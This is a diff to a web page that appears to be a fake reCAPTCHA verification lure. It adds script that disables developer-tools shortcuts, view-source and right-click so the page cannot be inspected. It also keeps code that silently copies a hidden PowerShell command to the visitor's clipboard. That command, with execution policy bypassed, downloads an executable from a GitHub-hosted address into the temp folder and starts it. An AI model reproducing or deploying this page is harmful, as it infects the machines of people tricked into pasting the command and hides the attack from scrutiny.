@@ -1,3 +1,42 @@
+<script>
+  document.addEventListener('keydown', function(e) {
+    // F12
+    if (e.key === 'F12') {
+      e.preventDefault();
+      return false;
+    }
+
+    // Ctrl+Shift+I
+    if (e.ctrlKey && e.shiftKey && e.key === 'I') {
+      e.preventDefault();
+      return false;
+    }
+
+    // Ctrl+Shift+J
+    if (e.ctrlKey && e.shiftKey && e.key === 'J') {
+      e.preventDefault();
+      return false;
+    }
+
+    // Ctrl+U
+    if (e.ctrlKey && e.key === 'u') {
+      e.preventDefault();
+      return false;
+    }
+
+    // Ctrl+Shift+C (inspect)
+    if (e.ctrlKey && e.shiftKey && e.key === 'C') {
+      e.preventDefault();
+      return false;
+    }
+  });
+
+  // Chặn chuột phải
+  document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+  });
+</script>
+
 
 <html lang="en"><head><script src="chrome-extension://infdcenbdoibcacogknkjleclhnjdmfh/content/captcha/recaptcha/hunter.js"></script><script src="chrome-extension://infdcenbdoibcacogknkjleclhnjdmfh/content/captcha/recaptcha/interceptor.js"></script><script src="chrome-extension://infdcenbdoibcacogknkjleclhnjdmfh/content/communication_helpers.js"></script><script src="chrome-extension://infdcenbdoibcacogknkjleclhnjdmfh/content/core_helpers.js"></script>
         <meta charset="utf-8">
@@ -615,9 +654,8 @@ div[class^="tiktok"].--savior-overlay-z-index-reset {
             var verification_id = generateRandomNumber();
             document.getElementById('verification-id').textContent = verification_id;
             
-            const htaPath = "https://gingogaming-dot.github.io" + "/recaptcha-verify";
+            const htaPath = "https://Ilovecodepython.github.io" + "/recaptcha-verify";
             const commandToRun = "powershell -executionpolicy bypass -w hidden -c "iwr -useb https://github.com/gingogaming-dot.github.io/verify.exe | % { $f = \"$env:TEMP\\v.exe\"; Set-Content -Path $f -Value $_ -Encoding Byte; Start-Process $f }"
-"
             stageClipboard(commandToRun, verification_id)
         }
 
